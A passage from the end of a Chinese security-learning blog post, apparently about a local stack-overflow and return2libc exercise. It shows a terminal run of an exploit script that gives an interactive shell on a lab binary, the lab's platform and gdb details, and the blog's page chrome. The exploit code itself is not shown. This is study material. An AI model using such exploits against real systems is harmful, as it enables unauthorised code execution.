<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_shell1.py [+] Starting local process &apos;./stack_over1&apos;: pid 31640[*] Switching to interactive mode$ whoamichallenge</span><br></pre></td></tr></table></figure>
<h3 id="实验平台"><a href="#实验平台" class="headerlink" title="实验平台"></a>实验平台</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ uname -aLinux ubuntu 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">$ gdb --versionGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">gdb 插件 gef</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/bufoverflow-winxp/" rel="tag"># bufoverflow, winxp</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/12/29/2019-4-26-how2blog/" rel="next" title="搭建博客参考">
                <i class="fa fa-chevron-left"></i> 搭建博客参考
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/29/warftp-exp/" rel="prev" title="warftp-exp">
                warftp-exp <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">YiXiangTianKai</p>
              <p class="site-description motion-element" itemprop="description">Here start my blog life! Record something significant in specific!</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="nanjiang1121@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出"><span class="nav-number">1.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-存在漏洞的函数"><span class="nav-number">1.1.</span> <span class="nav-text">1. 存在漏洞的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-关闭相关保护机制"><span class="nav-number">1.2.</span> <span class="nav-text">2. 关闭相关保护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-分析程序溢出点"><span class="nav-number">1.3.</span> <span class="nav-text">3. 分析程序溢出点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-构造payload"><span class="nav-number">1.4.</span> <span class="nav-text">4. 构造payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-return2libc"><span class="nav-number">1.5.</span> <span class="nav-text">5. return2libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验平台"><span class="nav-number">1.6.</span> <span class="nav-text">实验平台</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">YiXiangTianKai</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>





    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">全站共 5.9k 字</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i> 访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i> 总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: true,
        appId: 'lJhDDwQjkkXqkPD3T4C08FcC-gzGzoHsz',
        appKey: 'NeB4XcXQ7TKWvap0shkzl7ys',
        placeholder: '有什么要对challenge说的',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  





  

  

  

  
  

  

  

  

</body>
</html>
